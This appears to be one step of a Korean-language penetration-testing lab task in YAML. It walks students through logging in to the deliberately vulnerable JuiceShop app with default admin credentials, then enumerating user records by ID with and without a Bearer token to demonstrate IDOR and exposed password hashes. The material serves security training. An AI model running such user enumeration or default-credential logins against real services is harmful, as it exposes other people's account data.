  - order: 3
    instruction: |
      ## 🎯 MISSION — Bearer header 의 IDOR 5 user 시퀀스 + no-auth 비교

      JWT 획득 후 *Bearer header* 로 `/api/Users/{1..5}` 5 user 시퀀스 + Bearer 없는
      no-auth 응답 비교. *IDOR 의 핵심* — 본인 token 으로 *다른 user* 데이터 조회.

      ## 📚 사전 학습 (학생 혼돈 방지)

      - **IDOR** = Insecure Direct Object Reference — 권한 검증 없는 *직접 참조*
      - **Bearer header** = `Authorization: Bearer <JWT>` 의 표준
      - **5 user** = JuiceShop 의 기본 user 5 (id 1-5)
      - **본인 token = id 1 (admin)** — admin 의 *모든 user 조회* 권한 = *권한 분리
        결함*
      - **W08 step 3** 와 연결 = attack 의 동일 패턴

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker bash <<'SH'
      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
        http://10.20.30.1/rest/user/login \
        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)

      echo "=== IDOR with Bearer ==="
      for id in 1 2 3 4 5; do
        code=$(curl -s -o /dev/null -w '%{http_code}' \
          -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" \
          http://10.20.30.1/api/Users/$id)
        echo "user $id: $code"
      done

      echo ""
      echo "=== no-auth (Bearer 없이) ==="
      for id in 1 2 3 4 5; do
        code=$(curl -s -o /dev/null -w '%{http_code}' \
          -H 'Host: juice.6v6.lab' \
          http://10.20.30.1/api/Users/$id)
        echo "user $id (no auth): $code"
      done

      echo ""
      echo "=== user 2 의 데이터 (Bearer) ==="
      curl -s -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" \
        http://10.20.30.1/api/Users/2 | jq . 2>/dev/null | head -15
      SH
      ```

      ## 📋 확인 사항

      - Bearer 5 user 모두 200 (admin token 으로 *모든 user* 조회)
      - no-auth 5 user 모두 401 (정상 인증 거부)
      - user 2 의 데이터 = email / username / password (hash) / role
      - admin role 의 *권한 분리 결함* 인지

      ## 💡 왜 이걸 하는가?

      *modern API* 의 가장 흔한 결함 = *role-based 검증 부족*. admin 이 *본인 외 user
      조회* 가능 = *최소 권한 원칙 위반*.

      ## 🔍 결과 해석

      - **정상 (vuln)**: Bearer 5×200 + no-auth 5×401 + user 2 의 password hash 노출
      - **Bearer 도 401**: token expire — re-login
      - **모든 user 같은 데이터**: API mock — 실 DB 가 아님 (학습 환경 확인)

      ## 비정상 시 대응

      - **403 (admin 외 user 거부)**: JuiceShop 의 *권한 분리 적용* — 본 vuln 정정 된 버전
      - **password 노출 X**: API response 의 *필드 필터* — `?fields=*` 또는 query 추가
        시도

      ## 실측 검증 (2026-05-16)

      - Bearer with token=200 (user 1-3 PASS) ✓
      - no-auth=401 (정상 인증 거부) ✓
    hint: |
      Bearer header IDOR 5 user vs no-auth 비교 + user 2 data 분석.
    category: exploit
